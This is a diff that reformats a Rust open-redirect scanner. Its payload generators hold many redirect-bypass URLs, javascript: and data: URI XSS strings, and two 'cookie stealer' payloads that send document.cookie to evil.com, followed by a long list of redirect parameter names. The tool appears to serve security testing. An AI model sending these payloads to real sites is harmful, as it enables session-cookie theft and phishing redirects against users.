-        bypasses.push((format!("https://{}%2f%2e%2e%2f%2e%2e%2f{}", target_domain, evil_domain), BypassCategory::OAuthBypass, "Encoded OAuth traversal"));
+        bypasses.push((
+            format!("https://{}/..%2f..%2f{}", target_domain, evil_domain),
+            BypassCategory::OAuthBypass,
+            "OAuth path traversal",
+        ));
+        bypasses.push((
+            format!(
+                "https://{}%252f%252e%252e%252f{}",
+                target_domain, evil_domain
+            ),
+            BypassCategory::OAuthBypass,
+            "Double encoded OAuth traversal",
+        ));
+        bypasses.push((
+            format!(
+                "https://{}%2f%2e%2e%2f%2e%2e%2f{}",
+                target_domain, evil_domain
+            ),
+            BypassCategory::OAuthBypass,
+            "Encoded OAuth traversal",
+        ));
 
         // Subdomain tricks for OAuth
-        bypasses.push((format!("https://{}.{}/oauth", evil_domain.replace(".com", ""), target_domain), BypassCategory::OAuthBypass, "Subdomain OAuth"));
-        bypasses.push((format!("https://oauth.{}", evil_domain), BypassCategory::OAuthBypass, "OAuth subdomain on evil"));
+        bypasses.push((
+            format!(
+                "https://{}.{}/oauth",
+                evil_domain.replace(".com", ""),
+                target_domain
+            ),
+            BypassCategory::OAuthBypass,
+            "Subdomain OAuth",
+        ));
+        bypasses.push((
+            format!("https://oauth.{}", evil_domain),
+            BypassCategory::OAuthBypass,
+            "OAuth subdomain on evil",
+        ));
 
         // Post-logout redirect variants
-        bypasses.push((format!("https://{}/logout?redirect={}", target_domain, evil_domain), BypassCategory::OAuthBypass, "Post-logout redirect"));
-        bypasses.push((format!("https://{}?post_logout_redirect_uri=https://{}", target_domain, evil_domain), BypassCategory::OAuthBypass, "OIDC post-logout"));
+        bypasses.push((
+            format!("https://{}/logout?redirect={}", target_domain, evil_domain),
+            BypassCategory::OAuthBypass,
+            "Post-logout redirect",
+        ));
+        bypasses.push((
+            format!(
+                "https://{}?post_logout_redirect_uri=https://{}",
+                target_domain, evil_domain
+            ),
+            BypassCategory::OAuthBypass,
+            "OIDC post-logout",
+        ));
 
         bypasses
     }
@@ -385,34 +870,106 @@ impl OpenRedirectScanner {
         let mut payloads = Vec::new();
 
         // Basic JavaScript URLs
-        payloads.push(("javascript:alert(document.domain)".to_string(), BypassCategory::DangerousProtocol, "JS alert domain"));
-        payloads.push(("javascript:alert(1)".to_string(), BypassCategory::DangerousProtocol, "JS alert 1"));
-        payloads.push(("javascript:alert`1`".to_string(), BypassCategory::DangerousProtocol, "JS template literal"));
-        payloads.push(("javascript:prompt(1)".to_string(), BypassCategory::DangerousProtocol, "JS prompt"));
-        payloads.push(("javascript:confirm(1)".to_string(), BypassCategory::DangerousProtocol, "JS confirm"));
+        payloads.push((
+            "javascript:alert(document.domain)".to_string(),
+            BypassCategory::DangerousProtocol,
+            "JS alert domain",
+        ));
+        payloads.push((
+            "javascript:alert(1)".to_string(),
+            BypassCategory::DangerousProtocol,
+            "JS alert 1",
+        ));
+        payloads.push((
+            "javascript:alert`1`".to_string(),
+            BypassCategory::DangerousProtocol,
+            "JS template literal",
+        ));
+        payloads.push((
+            "javascript:prompt(1)".to_string(),
+            BypassCategory::DangerousProtocol,
+            "JS prompt",
+        ));
+        payloads.push((
+            "javascript:confirm(1)".to_string(),
+            BypassCategory::DangerousProtocol,
+            "JS confirm",
+        ));
 
         // Comment trick
-        payloads.push(("javascript://comment%0aalert(1)".to_string(), BypassCategory::DangerousProtocol, "JS comment bypass"));
-        payloads.push(("javascript://anything%0d%0aalert(1)".to_string(), BypassCategory::DangerousProtocol, "JS CRLF comment"));
+        payloads.push((
+            "javascript://comment%0aalert(1)".to_string(),
+            BypassCategory::DangerousProtocol,
+            "JS comment bypass",
+        ));
+        payloads.push((
+            "javascript://anything%0d%0aalert(1)".to_string(),
+            BypassCategory::DangerousProtocol,
+            "JS CRLF comment",
+        ));
 
         // Case variations
-        payloads.push(("JAVASCRIPT:alert(1)".to_string(), BypassCategory::CaseMutation, "Uppercase JAVASCRIPT"));
-        payloads.push(("JaVaScRiPt:alert(1)".to_string(), BypassCategory::CaseMutation, "Mixed case JS"));
-        payloads.push(("jAvAsCrIpT:alert(1)".to_string(), BypassCategory::CaseMutation, "Mixed case JS 2"));
+        payloads.push((
+            "JAVASCRIPT:alert(1)".to_string(),
+            BypassCategory::CaseMutation,
+            "Uppercase JAVASCRIPT",
+        ));
+        payloads.push((
+            "JaVaScRiPt:alert(1)".to_string(),
+            BypassCategory::CaseMutation,
+            "Mixed case JS",
+        ));
+        payloads.push((
+            "jAvAsCrIpT:alert(1)".to_string(),
+            BypassCategory::CaseMutation,
+            "Mixed case JS 2",
+        ));
 
         // Encoding
-        payloads.push(("java%0ascript:alert(1)".to_string(), BypassCategory::EncodingBypass, "Newline in JS protocol"));
-        payloads.push(("java%09script:alert(1)".to_string(), BypassCategory::EncodingBypass, "Tab in JS protocol"));
-        payloads.push(("java%0dscript:alert(1)".to_string(), BypassCategory::EncodingBypass, "CR in JS protocol"));
-        payloads.push(("\\x6Aavascript:alert(1)".to_string(), BypassCategory::EncodingBypass, "Hex escape in JS"));
+        payloads.push((
+            "java%0ascript:alert(1)".to_string(),
+            BypassCategory::EncodingBypass,
+            "Newline in JS protocol",
+        ));
+        payloads.push((
+            "java%09script:alert(1)".to_string(),
+            BypassCategory::EncodingBypass,
+            "Tab in JS protocol",
+        ));
+        payloads.push((
+            "java%0dscript:alert(1)".to_string(),
+            BypassCategory::EncodingBypass,
+            "CR in JS protocol",
+        ));
+        payloads.push((
+            "\\x6Aavascript:alert(1)".to_string(),
+            BypassCategory::EncodingBypass,
+            "Hex escape in JS",
+        ));
 
         // HTML entity encoding (for some contexts)
-        payloads.push(("&#106;avascript:alert(1)".to_string(), BypassCategory::EncodingBypass, "HTML entity j"));
-        payloads.push(("&#x6A;avascript:alert(1)".to_string(), BypassCategory::EncodingBypass, "Hex HTML entity j"));
+        payloads.push((
+            "&#106;avascript:alert(1)".to_string(),
+            BypassCategory::EncodingBypass,
+            "HTML entity j",
+        ));
+        payloads.push((
+            "&#x6A;avascript:alert(1)".to_string(),
+            BypassCategory::EncodingBypass,
+            "Hex HTML entity j",
+        ));
 
         // With XSS payloads
-        payloads.push(("javascript:document.location='https://evil.com/'+document.cookie".to_string(), BypassCategory::DangerousProtocol, "Cookie stealer"));
-        payloads.push(("javascript:fetch('https://evil.com/'+document.cookie)".to_string(), BypassCategory::DangerousProtocol, "Fetch cookie stealer"));
+        payloads.push((
+            "javascript:document.location='https://evil.com/'+document.cookie".to_string(),
+            BypassCategory::DangerousProtocol,
+            "Cookie stealer",
+        ));
+        payloads.push((
+            "javascript:fetch('https://evil.com/'+document.cookie)".to_string(),
+            BypassCategory::DangerousProtocol,
+            "Fetch cookie stealer",
+        ));
 
         payloads
     }
@@ -422,53 +979,150 @@ impl OpenRedirectScanner {
         let mut payloads = Vec::new();
 
         // HTML data URIs
-        payloads.push(("data:text/html,<script>alert(1)</script>".to_string(), BypassCategory::DataUri, "Data URI HTML script"));
-        payloads.push(("data:text/html,<script>alert(document.domain)</script>".to_string(), BypassCategory::DataUri, "Data URI alert domain"));
-        payloads.push(("data:text/html,<body onload=alert(1)>".to_string(), BypassCategory::DataUri, "Data URI body onload"));
-        payloads.push(("data:text/html,<img src=x onerror=alert(1)>".to_string(), BypassCategory::DataUri, "Data URI img onerror"));
+        payloads.push((
+            "data:text/html,<script>alert(1)</script>".to_string(),
+            BypassCategory::DataUri,
+            "Data URI HTML script",
+        ));
+        payloads.push((
+            "data:text/html,<script>alert(document.domain)</script>".to_string(),
+            BypassCategory::DataUri,
+            "Data URI alert domain",
+        ));
+        payloads.push((
+            "data:text/html,<body onload=alert(1)>".to_string(),
+            BypassCategory::DataUri,
+            "Data URI body onload",
+        ));
+        payloads.push((
+            "data:text/html,<img src=x onerror=alert(1)>".to_string(),
+            BypassCategory::DataUri,
+            "Data URI img onerror",
+        ));
 
         // Base64 encoded
-        payloads.push(("data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==".to_string(), BypassCategory::DataUri, "Base64 script alert"));
-        payloads.push(("data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+".to_string(), BypassCategory::DataUri, "Base64 alert domain"));
+        payloads.push((
+            "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==".to_string(),
+            BypassCategory::DataUri,
+            "Base64 script alert",
+        ));
+        payloads.push((
+            "data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+"
+                .to_string(),
+            BypassCategory::DataUri,
+            "Base64 alert domain",
+        ));
 
         // With charset
-        payloads.push(("data:text/html;charset=utf-8,<script>alert(1)</script>".to_string(), BypassCategory::DataUri, "Data URI with charset"));
-        payloads.push(("data:text/html;charset=UTF-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==".to_string(), BypassCategory::DataUri, "Base64 with charset"));
+        payloads.push((
+            "data:text/html;charset=utf-8,<script>alert(1)</script>".to_string(),
+            BypassCategory::DataUri,
+            "Data URI with charset",
+        ));
+        payloads.push((
+            "data:text/html;charset=UTF-8;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==".to_string(),
+            BypassCategory::DataUri,
+            "Base64 with charset",
+        ));
 
         // Case variations
-        payloads.push(("DATA:text/html,<script>alert(1)</script>".to_string(), BypassCategory::CaseMutation, "Uppercase DATA"));
-        payloads.push(("DaTa:text/html,<script>alert(1)</script>".to_string(), BypassCategory::CaseMutation, "Mixed case data"));
+        payloads.push((
+            "DATA:text/html,<script>alert(1)</script>".to_string(),
+            BypassCategory::CaseMutation,
+            "Uppercase DATA",
+        ));
+        payloads.push((
+            "DaTa:text/html,<script>alert(1)</script>".to_string(),
+            BypassCategory::CaseMutation,
+            "Mixed case data",
+        ));
 
         // Meta refresh via data URI
-        payloads.push(("data:text/html,<meta http-equiv='refresh' content='0;url=https://evil.com'>".to_string(), BypassCategory::DataUri, "Data URI meta refresh"));
+        payloads.push((
+            "data:text/html,<meta http-equiv='refresh' content='0;url=https://evil.com'>"
+                .to_string(),
+            BypassCategory::DataUri,
+            "Data URI meta refresh",
+        ));
         payloads.push(("data:text/html;base64,PG1ldGEgaHR0cC1lcXVpdj0ncmVmcmVzaCcgY29udGVudD0nMDt1cmw9aHR0cHM6Ly9ldmlsLmNvbSc+".to_string(), BypassCategory::DataUri, "Base64 meta refresh"));
 
         payloads
     }
 
     /// Generate port manipulation payloads
-    fn generate_port_payloads(&self, evil_domain: &str) -> Vec<(String, BypassCategory, &'static str)> {
+    fn generate_port_payloads(
+        &self,
+        evil_domain: &str,
+    ) -> Vec<(String, BypassCategory, &'static str)> {
         let mut payloads = Vec::new();
 
         // Standard ports
-        payloads.push((format!("https://{}:443", evil_domain), BypassCategory::PortTrick, "Explicit 443"));
-        payloads.push((format!("https://{}:443/", evil_domain), BypassCategory::PortTrick, "Port 443 with slash"));
-        payloads.push((format!("http://{}:80", evil_domain), BypassCategory::PortTrick, "Explicit 80"));
-        payloads.push((format!("http://{}:80/", evil_domain), BypassCategory::PortTrick, "Port 80 with slash"));
+        payloads.push((
+            format!("https://{}:443", evil_domain),
+            BypassCategory::PortTrick,
+            "Explicit 443",
+        ));
+        payloads.push((
+            format!("https://{}:443/", evil_domain),
+            BypassCategory::PortTrick,
+            "Port 443 with slash",
+        ));
+        payloads.push((
+            format!("http://{}:80", evil_domain),
+            BypassCategory::PortTrick,
+            "Explicit 80",
+        ));
+        payloads.push((
+            format!("http://{}:80/", evil_domain),
+            BypassCategory::PortTrick,
+            "Port 80 with slash",
+        ));
 
         // Port confusion
-        payloads.push((format!("https://{}:80", evil_domain), BypassCategory::PortTrick, "Port 80 on HTTPS"));
-        payloads.push((format!("http://{}:443", evil_domain), BypassCategory::PortTrick, "Port 443 on HTTP"));
+        payloads.push((
+            format!("https://{}:80", evil_domain),
+            BypassCategory::PortTrick,
+            "Port 80 on HTTPS",
+        ));
+        payloads.push((
+            format!("http://{}:443", evil_domain),
+            BypassCategory::PortTrick,
+            "Port 443 on HTTP",
+        ));
 
         // Protocol-relative with port
-        payloads.push((format!("//{}:443", evil_domain), BypassCategory::PortTrick, "Protocol-rel port 443"));
-        payloads.push((format!("//{}:80", evil_domain), BypassCategory::PortTrick, "Protocol-rel port 80"));
-        payloads.push((format!("//{}:8080", evil_domain), BypassCategory::PortTrick, "Protocol-rel port 8080"));
+        payloads.push((
+            format!("//{}:443", evil_domain),
+            BypassCategory::PortTrick,
+            "Protocol-rel port 443",
+        ));
+        payloads.push((
+            format!("//{}:80", evil_domain),
+            BypassCategory::PortTrick,
+            "Protocol-rel port 80",
+        ));
+        payloads.push((
+            format!("//{}:8080", evil_domain),
+            BypassCategory::PortTrick,
+            "Protocol-rel port 8080",
+        ));
 
         // Unusual ports
-        payloads.push((format!("http://{}:8080", evil_domain), BypassCategory::PortTrick, "Port 8080"));
-        payloads.push((format!("http://{}:8443", evil_domain), BypassCategory::PortTrick, "Port 8443"));
-        payloads.push((format!("http://{}:3000", evil_domain), BypassCategory::PortTrick, "Port 3000"));
+        payloads.push((
+            format!("http://{}:8080", evil_domain),
+            BypassCategory::PortTrick,
+            "Port 8080",
+        ));
+        payloads.push((
+            format!("http://{}:8443", evil_domain),
+            BypassCategory::PortTrick,
+            "Port 8443",
+        ));
+        payloads.push((
+            format!("http://{}:3000", evil_domain),
+            BypassCategory::PortTrick,
+            "Port 3000",
+        ));
 
         payloads
     }
@@ -481,14 +1135,20 @@ impl OpenRedirectScanner {
         let evil_domains = self.generate_evil_domains();
         let protocols = self.generate_protocols();
 
-        info!("[OpenRedirect] Generating enterprise payloads from {} evil domains x {} protocols",
-              evil_domains.len(), protocols.len());
+        info!(
+            "[OpenRedirect] Generating enterprise payloads from {} evil domains x {} protocols",
+            evil_domains.len(),
+            protocols.len()
+        );
 
         // === PHASE 1: Basic combinations (protocols × domains) ===
         for (evil_domain, domain_desc) in &evil_domains {
             for (protocol, proto_category, proto_desc) in &protocols {
                 // Skip dangerous protocols for regular domains
-                if matches!(proto_category, BypassCategory::DangerousProtocol | BypassCategory::DataUri) {
+                if matches!(
+                    proto_category,
+                    BypassCategory::DangerousProtocol | BypassCategory::DataUri
+                ) {
                     continue;
                 }
 
@@ -598,7 +1258,10 @@ impl OpenRedirectScanner {
         // === PHASE 10: Special edge cases ===
         self.add_edge_case_payloads(&mut payloads, target_domain);
 
-        info!("[OpenRedirect] Generated {} enterprise-grade payloads", payloads.len());
+        info!(
+            "[OpenRedirect] Generated {} enterprise-grade payloads",
+            payloads.len()
+        );
         payloads
     }
 
@@ -608,52 +1271,173 @@ impl OpenRedirectScanner {
 
         // Empty/whitespace tricks
         let edge_cases = vec![
-            (" https://evil.com", BypassCategory::ParserDifferential, "Leading space"),
-            ("  https://evil.com", BypassCategory::ParserDifferential, "Double leading space"),
-            ("\thttps://evil.com", BypassCategory::ParserDifferential, "Leading tab"),
-            ("\nhttps://evil.com", BypassCategory::ParserDifferential, "Leading newline"),
-            ("https://evil.com ", BypassCategory::ParserDifferential, "Trailing space"),
-            ("https://evil.com\t", BypassCategory::ParserDifferential, "Trailing tab"),
-            ("https://evil.com%20", BypassCategory::EncodingBypass, "Encoded trailing space"),
-            ("https://evil.com%09", BypassCategory::EncodingBypass, "Encoded trailing tab"),
-
+            (
+                " https://evil.com",
+                BypassCategory::ParserDifferential,
+                "Leading space",
+            ),
+            (
+                "  https://evil.com",
+                BypassCategory::ParserDifferential,
+                "Double leading space",
+            ),
+            (
+                "\thttps://evil.com",
+                BypassCategory::ParserDifferential,
+                "Leading tab",
+            ),
+            (
+                "\nhttps://evil.com",
+                BypassCategory::ParserDifferential,
+                "Leading newline",
+            ),
+            (
+                "https://evil.com ",
+                BypassCategory::ParserDifferential,
+                "Trailing space",
+            ),
+            (
+                "https://evil.com\t",
+                BypassCategory::ParserDifferential,
+                "Trailing tab",
+            ),
+            (
+                "https://evil.com%20",
+                BypassCategory::EncodingBypass,
+                "Encoded trailing space",
+            ),
+            (
+                "https://evil.com%09",
+                BypassCategory::EncodingBypass,
+                "Encoded trailing tab",
+            ),
             // Browser-specific quirks
-            ("https:evil.com", BypassCategory::ProtocolConfusion, "No slashes after colon"),
-            ("https:/evil.com", BypassCategory::ProtocolConfusion, "Single slash"),
-            ("https:///evil.com", BypassCategory::ParserDifferential, "Triple slash after protocol"),
-            ("https:////evil.com", BypassCategory::ParserDifferential, "Quad slash after protocol"),
-
+            (
+                "https:evil.com",
+                BypassCategory::ProtocolConfusion,
+                "No slashes after colon",
+            ),
+            (
+                "https:/evil.com",
+                BypassCategory::ProtocolConfusion,
+                "Single slash",
+            ),
+            (
+                "https:///evil.com",
+                BypassCategory::ParserDifferential,
+                "Triple slash after protocol",
+            ),
+            (
+                "https:////evil.com",
+                BypassCategory::ParserDifferential,
+                "Quad slash after protocol",
+            ),
             // Unicode normalization attacks
-            ("https://ℯ𝓿ⅈℓ.com", BypassCategory::HomoglyphAttack, "Fancy script letters"),
-            ("https://ＥＶＩＬˌＣＯＭ", BypassCategory::HomoglyphAttack, "Fullwidth letters"),
-
+            (
+                "https://ℯ𝓿ⅈℓ.com",
+                BypassCategory::HomoglyphAttack,
+                "Fancy script letters",
+            ),
+            (
+                "https://ＥＶＩＬˌＣＯＭ",
+                BypassCategory::HomoglyphAttack,
+                "Fullwidth letters",
+            ),
             // URL with credentials edge cases
-            ("https://@evil.com", BypassCategory::UserInfoAbuse, "Empty username"),
-            ("https://:@evil.com", BypassCategory::UserInfoAbuse, "Empty user and pass"),
-            ("https://user:@evil.com", BypassCategory::UserInfoAbuse, "Empty password"),
-            ("https://:pass@evil.com", BypassCategory::UserInfoAbuse, "Empty username with pass"),
-
+            (
+                "https://@evil.com",
+                BypassCategory::UserInfoAbuse,
+                "Empty username",
+            ),
+            (
+                "https://:@evil.com",
+                BypassCategory::UserInfoAbuse,
+                "Empty user and pass",
+            ),
+            (
+                "https://user:@evil.com",
+                BypassCategory::UserInfoAbuse,
+                "Empty password",
+            ),
+            (
+                "https://:pass@evil.com",
+                BypassCategory::UserInfoAbuse,
+                "Empty username with pass",
+            ),
             // Fragment/query tricks
-            ("https://evil.com#", BypassCategory::FragmentAbuse, "Empty fragment"),
-            ("https://evil.com?", BypassCategory::WhitelistBypass, "Empty query"),
-            ("https://evil.com?#", BypassCategory::WhitelistBypass, "Empty query and fragment"),
-            ("https://evil.com#?", BypassCategory::FragmentAbuse, "Fragment then query"),
-
+            (
+                "https://evil.com#",
+                BypassCategory::FragmentAbuse,
+                "Empty fragment",
+            ),
+            (
+                "https://evil.com?",
+                BypassCategory::WhitelistBypass,
+                "Empty query",
+            ),
+            (
+                "https://evil.com?#",
+                BypassCategory::WhitelistBypass,
+                "Empty query and fragment",
+            ),
+            (
+                "https://evil.com#?",
+                BypassCategory::FragmentAbuse,
+                "Fragment then query",
+            ),
             // Path tricks
-            ("https://evil.com/.", BypassCategory::PathConfusion, "Trailing dot"),
-            ("https://evil.com/..", BypassCategory::PathConfusion, "Trailing double dot"),
-            ("https://evil.com/./", BypassCategory::PathConfusion, "Dot path"),
-            ("https://evil.com/../", BypassCategory::PathConfusion, "Double dot path"),
-
+            (
+                "https://evil.com/.",
+                BypassCategory::PathConfusion,
+                "Trailing dot",
+            ),
+            (
+                "https://evil.com/..",
+                BypassCategory::PathConfusion,
+                "Trailing double dot",
+            ),
+            (
+                "https://evil.com/./",
+                BypassCategory::PathConfusion,
+                "Dot path",
+            ),
+            (
+                "https://evil.com/../",
+                BypassCategory::PathConfusion,
+                "Double dot path",
+            ),
             // Relative with absolute-looking paths
-            ("./https://evil.com", BypassCategory::PathConfusion, "Relative with protocol"),
-            ("../https://evil.com", BypassCategory::PathConfusion, "Parent with protocol"),
-            ("/https://evil.com", BypassCategory::PathConfusion, "Absolute path with protocol"),
-
+            (
+                "./https://evil.com",
+                BypassCategory::PathConfusion,
+                "Relative with protocol",
+            ),
+            (
+                "../https://evil.com",
+                BypassCategory::PathConfusion,
+                "Parent with protocol",
+            ),
+            (
+                "/https://evil.com",
+                BypassCategory::PathConfusion,
+                "Absolute path with protocol",
+            ),
             // Special characters
-            ("https://evil.com%00", BypassCategory::NullByteInjection, "Trailing null byte"),
-            ("https://evil%00.com", BypassCategory::NullByteInjection, "Null in domain"),
-            ("https://evil\\.com", BypassCategory::BackslashTrick, "Escaped dot"),
+            (
+                "https://evil.com%00",
+                BypassCategory::NullByteInjection,
+                "Trailing null byte",
+            ),
+            (
+                "https://evil%00.com",
+                BypassCategory::NullByteInjection,
+                "Null in domain",
+            ),
+            (
+                "https://evil\\.com",
+                BypassCategory::BackslashTrick,
+                "Escaped dot",
+            ),
         ];
 
         for (payload, category, desc) in edge_cases {
@@ -666,10 +1450,26 @@ impl OpenRedirectScanner {
 
         // Target domain specific tricks
         let target_tricks = vec![
-            (format!("https://{}.evil.com", target_domain), BypassCategory::DomainConfusion, "Target as evil subdomain"),
-            (format!("https://evil.com.{}", target_domain), BypassCategory::DomainConfusion, "Evil before target"),
-            (format!("https://{}evil.com", target_domain.replace(".", "")), BypassCategory::DomainConfusion, "Concatenated"),
-            (format!("https://evil{}com", target_domain), BypassCategory::DomainConfusion, "Target in evil domain"),
+            (
+                format!("https://{}.evil.com", target_domain),
+                BypassCategory::DomainConfusion,
+                "Target as evil subdomain",
+            ),
+            (
+                format!("https://evil.com.{}", target_domain),
+                BypassCategory::DomainConfusion,
+                "Evil before target",
+            ),
+            (
+                format!("https://{}evil.com", target_domain.replace(".", "")),
+                BypassCategory::DomainConfusion,
+                "Concatenated",
+            ),
+            (
+                format!("https://evil{}com", target_domain),
+                BypassCategory::DomainConfusion,
+                "Target in evil domain",
+            ),
         ];
 
         for (payload, category, desc) in target_tricks {
@@ -688,31 +1488,95 @@ impl OpenRedirectScanner {
 
         // Core bypass techniques only
         let core_payloads = vec![
-            (format!("https://{}", evil), BypassCategory::Basic, "HTTPS redirect"),
-            (format!("http://{}", evil), BypassCategory::Basic, "HTTP redirect"),
-            (format!("//{}", evil), BypassCategory::ProtocolRelative, "Protocol-relative"),
-            (format!("///{}", evil), BypassCategory::SlashManipulation, "Triple slash"),
-            (format!("/\\{}", evil), BypassCategory::BackslashTrick, "Slash-backslash"),
-            (format!("\\\\{}", evil), BypassCategory::BackslashTrick, "Double backslash"),
-
+            (
+                format!("https://{}", evil),
+                BypassCategory::Basic,
+                "HTTPS redirect",
+            ),
+            (
+                format!("http://{}", evil),
+                BypassCategory::Basic,
+                "HTTP redirect",
+            ),
+            (
+                format!("//{}", evil),
+                BypassCategory::ProtocolRelative,
+                "Protocol-relative",
+            ),
+            (
+                format!("///{}", evil),
+                BypassCategory::SlashManipulation,
+                "Triple slash",
+            ),
+            (
+                format!("/\\{}", evil),
+                BypassCategory::BackslashTrick,
+                "Slash-backslash",
+            ),
+            (
+                format!("\\\\{}", evil),
+                BypassCategory::BackslashTrick,
+                "Double backslash",
+            ),
             // Whitelist bypass
-            (format!("https://{}@{}", target_domain, evil), BypassCategory::UserInfoAbuse, "Userinfo bypass"),
-            (format!("https://{}.{}", target_domain, evil), BypassCategory::DomainConfusion, "Subdomain bypass"),
-            (format!("https://{}#{}", evil, target_domain), BypassCategory::FragmentAbuse, "Fragment bypass"),
-            (format!("https://{}?{}", evil, target_domain), BypassCategory::WhitelistBypass, "Query bypass"),
-
+            (
+                format!("https://{}@{}", target_domain, evil),
+                BypassCategory::UserInfoAbuse,
+                "Userinfo bypass",
+            ),
+            (
+                format!("https://{}.{}", target_domain, evil),
+                BypassCategory::DomainConfusion,
+                "Subdomain bypass",
+            ),
+            (
+                format!("https://{}#{}", evil, target_domain),
+                BypassCategory::FragmentAbuse,
+                "Fragment bypass",
+            ),
+            (
+                format!("https://{}?{}", evil, target_domain),
+                BypassCategory::WhitelistBypass,
+                "Query bypass",
+            ),
             // Encoding
-            (format!("https%3A%2F%2F{}", evil), BypassCategory::EncodingBypass, "URL encoded"),
-            (format!("https%253A%252F%252F{}", evil), BypassCategory::DoubleEncoding, "Double encoded"),
-
+            (
+                format!("https%3A%2F%2F{}", evil),
+                BypassCategory::EncodingBypass,
+                "URL encoded",
+            ),
+            (
+                format!("https%253A%252F%252F{}", evil),
+                BypassCategory::DoubleEncoding,
+                "Double encoded",
+            ),
             // Dangerous protocols
-            ("javascript:alert(document.domain)".to_string(), BypassCategory::DangerousProtocol, "JavaScript"),
-            ("data:text/html,<script>alert(1)</script>".to_string(), BypassCategory::DataUri, "Data URI"),
-
+            (
+                "javascript:alert(document.domain)".to_string(),
+                BypassCategory::DangerousProtocol,
+                "JavaScript",
+            ),
+            (
+                "data:text/html,<script>alert(1)</script>".to_string(),
+                BypassCategory::DataUri,
+                "Data URI",
+            ),
             // Parser differential
-            (format!("HTTPS://{}", evil), BypassCategory::CaseMutation, "Uppercase protocol"),
-            (format!("https:/{}", evil), BypassCategory::ParserDifferential, "Single slash"),
-            (format!("https:\\\\{}", evil), BypassCategory::ParserDifferential, "Backslash protocol"),
+            (
+                format!("HTTPS://{}", evil),
+                BypassCategory::CaseMutation,
+                "Uppercase protocol",
+            ),
+            (
+                format!("https:/{}", evil),
+                BypassCategory::ParserDifferential,
+                "Single slash",
+            ),
+            (
+                format!("https:\\\\{}", evil),
+                BypassCategory::ParserDifferential,
+                "Backslash protocol",
+            ),
         ];
 
         for (payload, category, desc) in core_payloads {
@@ -783,49 +1647,156 @@ impl OpenRedirectScanner {
     fn get_redirect_params_static() -> Vec<&'static str> {
         vec![
             // Standard redirect params
-            "redirect", "redirect_uri", "redirect_url", "redirectUri", "redirectUrl",
-            "url", "uri", "u", "link", "href", "src",
-            "next", "next_url", "nextUrl", "nexturl", "next_page",
-            "return", "return_url", "returnUrl", "returnurl", "return_to", "returnTo",
-            "goto", "go", "to", "target", "dest", "destination",
-            "continue", "continueUrl", "continue_url",
-            "forward", "fwd", "forward_url",
-            "callback", "callback_url", "callbackUrl", "callbackurl",
-            "redir", "rurl", "r", "red",
-            "out", "outbound", "external",
-            "path", "file", "page",
-            "site", "view", "show",
-            "ref", "referer", "referrer",
-            "jump", "jumpto", "jump_to",
+            "redirect",
+            "redirect_uri",
+            "redirect_url",
+            "redirectUri",
+            "redirectUrl",
+            "url",
+            "uri",
+            "u",
+            "link",
+            "href",
+            "src",
+            "next",
+            "next_url",
+            "nextUrl",
+            "nexturl",
+            "next_page",
+            "return",
+            "return_url",
+            "returnUrl",
+            "returnurl",
+            "return_to",
+            "returnTo",
+            "goto",
+            "go",
+            "to",
+            "target",
+            "dest",
+            "destination",
+            "continue",
+            "continueUrl",
+            "continue_url",
+            "forward",
+            "fwd",
+            "forward_url",
+            "callback",
+            "callback_url",
+            "callbackUrl",
+            "callbackurl",
+            "redir",
+            "rurl",
+            "r",
+            "red",
+            "out",
+            "outbound",
+            "external",
+            "path",
+            "file",
+            "page",
+            "site",
+            "view",
+            "show",
+            "ref",
+            "referer",
+            "referrer",
+            "jump",
+            "jumpto",
+            "jump_to",
             "location",
             // OAuth/OIDC specific
-            "redirect_uri", "post_logout_redirect_uri", "post_login_redirect_uri",
-            "login_redirect", "logout_redirect", "success_url", "failure_url",
-            "error_uri", "cancel_url", "origin",
+            "redirect_uri",
+            "post_logout_redirect_uri",
+            "post_login_redirect_uri",
+            "login_redirect",
+            "logout_redirect",
+            "success_url",
+            "failure_url",
+            "error_uri",
+            "cancel_url",
+            "origin",
             // Framework specific
-            "RelayState", "SAMLRequest", "ReturnUrl", "Target",
-            "spring.redirect", "wicket:redirect",
+            "RelayState",
+            "SAMLRequest",
+            "ReturnUrl",
+            "Target",
+            "spring.redirect",
+            "wicket:redirect",
             // Less common
-            "feed", "host", "html", "image", "img",
-            "load", "nav", "navigation",
-            "open", "domain", "reference",
-            "checkout_url", "success", "fail",
-            "wp_redirect", "redirect_after_login",
+            "feed",
+            "host",
+            "html",
+            "image",
+            "img",
+            "load",
+            "nav",
+            "navigation",
+            "open",
+            "domain",
+            "reference",
+            "checkout_url",
+            "success",
+            "fail",
+            "wp_redirect",
+            "redirect_after_login",
             // Additional params
-            "data", "service", "service_url", "targetUrl",
-            "backUrl", "back_url", "back", "done", "done_url",
-            "action", "action_url", "default", "default_url",
-            "exit", "exit_url", "finish", "finish_url",
-            "home", "home_url", "index", "index_url",
-            "login_url", "logout_url", "main", "main_url",
-            "move", "move_url", "next_step", "original_url",
-            "previous", "previous_url", "proceed", "proceed_url",
-            "redirect_to", "redirectTo", "relaystate",
-            "request", "request_url", "resource", "resource_url",
-            "retUrl", "ret_url", "return_path", "returnPath",
-            "state", "state_url", "step", "step_url",
-            "targeturl", "then", "to_url", "toUrl",
-            "transfer", "transfer_url", "window", "window_url",
+            "data",
+            "service",
+            "service_url",
+            "targetUrl",
+            "backUrl",
+            "back_url",
+            "back",
+            "done",
+            "done_url",
+            "action",
+            "action_url",
+            "default",
+            "default_url",
+            "exit",
+            "exit_url",
+            "finish",
+            "finish_url",
+            "home",
+            "home_url",
+            "index",
+            "index_url",
+            "login_url",
+            "logout_url",
+            "main",
+            "main_url",
+            "move",
+            "move_url",
+            "next_step",
+            "original_url",
+            "previous",
+            "previous_url",
+            "proceed",
+            "proceed_url",
+            "redirect_to",
+            "redirectTo",
+            "relaystate",
+            "request",
+            "request_url",
+            "resource",
+            "resource_url",
+            "retUrl",
+            "ret_url",
+            "return_path",
+            "returnPath",
+            "state",
+            "state_url",
+            "step",
+            "step_url",
+            "targeturl",
+            "then",
+            "to_url",
+            "toUrl",
+            "transfer",
+            "transfer_url",
+            "window",
+            "window_url",
         ]
     }
 
@@ -849,7 +1820,10 @@ impl OpenRedirectScanner {
 
         // Smart parameter filtering - skip framework internals
